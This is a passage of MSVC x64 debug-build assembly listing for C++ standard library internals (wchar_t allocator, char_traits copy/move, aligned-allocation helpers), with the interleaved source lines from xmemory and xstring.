	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 746  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 224
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  0001f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Count$ = 232
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YA_K_K@Z ; std::_Get_size_of_n<2>
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 983  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
_Count$ = 240
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	48 8b d0	 mov	 rdx, rax
  00036	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0003d	e8 00 00 00 00	 call	 ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 978  :     }

  00042	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00049	5f		 pop	 rdi
  0004a	5d		 pop	 rbp
  0004b	c3		 ret	 0
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2327 :     _Xlength_error("string too long");

  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  00022	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
$LN2@Xlen_strin:

; 2328 : }

  00027	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002e	5f		 pop	 rdi
  0002f	5d		 pop	 rbp
  00030	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	0f b7 09	 movzx	 ecx, WORD PTR [rcx]
  00035	66 89 08	 mov	 WORD PTR [rax], cx

; 301  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 224
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First$[rbp]
  00026	e8 00 00 00 00	 call	 wcslen

; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 105  :                     _First1[_Idx] = _First2[_Idx];
; 106  :                 }
; 107  :             } else {
; 108  :                 for (size_t _Idx = _Count; _Idx != 0; --_Idx) {
; 109  :                     _First1[_Idx - 1] = _First2[_Idx - 1];
; 110  :                 }
; 111  :             }
; 112  : 
; 113  :             return _First1;
; 114  :         }
; 115  : #endif // _HAS_CXX20
; 116  : 
; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memmove

; 118  : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 119  : 
; 120  :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 121  :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::move
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 68   :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
__formal$ = 240
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00037	5f		 pop	 rdi
  00038	5d		 pop	 rbp
  00039	c3		 ret	 0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z PROC ; std::_Container_base0::_Alloc_proxy, COMDAT

; 1178 :     _CONSTEXPR20 void _Alloc_proxy(const _Fake_allocator&) noexcept {}

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002b	5f		 pop	 rdi
  0002c	5d		 pop	 rbp
  0002d	c3		 ret	 0
?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ENDP ; std::_Container_base0::_Alloc_proxy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Orphan_all@_Container_base0@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Orphan_all@_Container_base0@std@@QEAAXXZ PROC		; std::_Container_base0::_Orphan_all, COMDAT

; 1176 :     _CONSTEXPR20 void _Orphan_all() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Orphan_all@_Container_base0@std@@QEAAXXZ ENDP		; std::_Container_base0::_Orphan_all
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z
_TEXT	SEGMENT
_Ptr_user$ = 8
_Ptr_container$ = 40
_Min_back_shift$ = 72
_Back_shift$ = 104
_Ptr$ = 352
_Bytes$ = 360
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z PROC ; std::_Adjust_manually_vector_aligned, COMDAT

; 158  : inline void _Adjust_manually_vector_aligned(void*& _Ptr, size_t& _Bytes) {

$LN11:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 68 01
	00 00		 sub	 rsp, 360		; 00000168H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 159  :     // adjust parameters from _Allocate_manually_vector_aligned to pass to operator delete
; 160  :     _Bytes += _Non_user_size;

  00024	48 8b 85 68 01
	00 00		 mov	 rax, QWORD PTR _Bytes$[rbp]
  0002b	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0002e	48 83 c0 27	 add	 rax, 39			; 00000027H
  00032	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00039	48 89 01	 mov	 QWORD PTR [rcx], rax

; 161  : 
; 162  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);

  0003c	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  00043	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00046	48 89 45 08	 mov	 QWORD PTR _Ptr_user$[rbp], rax

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0004a	b8 08 00 00 00	 mov	 eax, 8
  0004f	48 6b c0 ff	 imul	 rax, rax, -1
  00053	48 8b 4d 08	 mov	 rcx, QWORD PTR _Ptr_user$[rbp]
  00057	48 8b 04 01	 mov	 rax, QWORD PTR [rcx+rax]
  0005b	48 89 45 28	 mov	 QWORD PTR _Ptr_container$[rbp], rax

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);

  0005f	48 c7 45 48 08
	00 00 00	 mov	 QWORD PTR _Min_back_shift$[rbp], 8

; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00067	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  0006e	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  00072	48 8b 00	 mov	 rax, QWORD PTR [rax]
  00075	48 2b c1	 sub	 rax, rcx
  00078	48 89 45 68	 mov	 QWORD PTR _Back_shift$[rbp], rax
$LN4@Adjust_man:

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0007c	48 83 7d 68 08	 cmp	 QWORD PTR _Back_shift$[rbp], 8
